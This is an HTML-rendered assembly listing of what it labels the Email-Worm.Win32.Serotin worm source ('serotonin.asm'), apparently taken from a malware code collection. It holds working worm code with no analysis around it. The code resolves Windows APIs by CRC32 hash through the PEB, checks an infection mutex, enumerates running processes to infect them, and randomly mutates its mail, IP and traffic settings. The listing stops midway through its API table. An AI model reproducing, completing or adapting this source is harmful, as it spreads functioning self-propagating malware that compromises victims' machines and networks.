<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Serotin - serotonin.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">cor.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">consts.inc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">


    </span><span class="sc1">;Start of worm's body</span><span class="sc0">


    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">    </span><span class="sc1">;__try block</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_gdelta</span><span class="sc0">             </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">_gdelta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;to EBP</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;PEB in EAX</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">js</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">             </span><span class="sc1">;quit if not on WinNT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;1st loaded module</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;base of kernel32.dll in EAX</span><span class="sc0">
                        </span><span class="sc1">;(kisses to Ratter/29A ;-)</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_apiz</span><span class="sc0">            </span><span class="sc1">;find addresses of APIz</span><span class="sc0">


    </span><span class="sc1">;HeapFree API in kernel32.dll is forwarded to NTDLL.RtlFreeHeap API</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'NTDLL'</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get base address of NTDLL.DLL</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_seh</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'RtlFreeHeap'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;find address of RtlFreeHeap API</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_HeapFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">psapi_apiz</span><span class="sc0">          </span><span class="sc1">;find addresses of PSAPI.dll APIz</span><span class="sc0">


</span><span class="sc5">mutexName</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'$serotonin@'</span><span class="sc0">           </span><span class="sc1">;mutex name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_OpenMutexA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;open worm mutex</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">             </span><span class="sc1">;quit if already installed</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_GetModuleFileNameA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get worm's filename</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mutate</span><span class="sc0">              </span><span class="sc1">;mutate some variables</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">procz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_EnumProcesses</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;enumerate all running processes</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">p_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get PID</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_ps</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">analyse_process</span><span class="sc0">         </span><span class="sc1">;and try to infect it</span><span class="sc0">
</span><span class="sc5">ps_patch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">p_search</span><span class="sc0">

</span><span class="sc5">end_ps</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_psapi</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_FreeLibrary</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;free PSAPI.dll</span><span class="sc0">



</span><span class="sc5">end_seh</span><span class="sc4">:</span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;__except block</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">






</span><span class="sc5">mutate</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">             </span><span class="sc1">;get random number &lt;0..2&gt;</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">next_variable1</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sub1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">            </span><span class="sc1">;get random number &lt;0..5&gt;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_mailnum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc1">;increment variable</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_variable2</span><span class="sc0">
</span><span class="sc5">sub1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">            </span><span class="sc1">;get random number &lt;0..5&gt;</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_mailnum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc1">;decrement variable</span><span class="sc0">

</span><span class="sc5">next_variable1</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; ----- " " -----</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">next_variable2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sub2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_sleep_time</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_variable2</span><span class="sc0">
</span><span class="sc5">sub2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_sleep_time</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">next_variable2</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; ----- " " -----</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">next_variable3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sub3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_ipsnum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_variable3</span><span class="sc0">
</span><span class="sc5">sub3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_ipsnum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">next_variable3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">next_variable4</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sub4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_clientnum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_variable4</span><span class="sc0">
</span><span class="sc5">sub4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_clientnum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">next_variable4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">next_variable5</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sub5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_time</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_variable5</span><span class="sc0">
</span><span class="sc5">sub5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd6</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_time</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">next_variable5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">             </span><span class="sc1">;get random number &lt;0..1&gt;</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_mutate</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; ----- " " -----</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_nonstop_traffic</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">end_mutate</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;write variable</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;get random number &lt;0..5&gt;</span><span class="sc0">

</span><span class="sc5">get_rnd6</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;get random number &lt;0..[esp+4]&gt;</span><span class="sc0">

</span><span class="sc5">get_rnd</span><span class="sc4">:</span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">310Fh</span><span class="sc0">               </span><span class="sc1">;RDTCS</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;result in EDX</span><span class="sc0">
</span><span class="sc5">mutate</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">






</span><span class="sc1">;retrieves all needed API addresses from KERNEL32.dll</span><span class="sc0">

</span><span class="sc5">get_apiz</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;base of K32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">c_find</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">           </span><span class="sc1">;calculate CRC32 of the API</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">n_apiz</span><span class="sc0">          </span><span class="sc1">;number of apiz</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@callz</span><span class="sc0">
</span><span class="sc5">s_apiz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04134D1ADh</span><span class="sc0">      </span><span class="sc1">;LoadLibraryA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AFDF191Fh</span><span class="sc0">      </span><span class="sc1">;FreeLibrary</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0FFC97C1Fh</span><span class="sc0">      </span><span class="sc1">;GetProcAddress</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">033D350C4h</span><span class="sc0">      </span><span class="sc1">;OpenProcess</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">068624A9Dh</span><span class="sc0">      </span><span class="sc1">;CloseHandle</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0DA89FC22h</span><span class="sc0">      </span><span class="sc1">;VirtualAllocEx</span><span class="sc0">
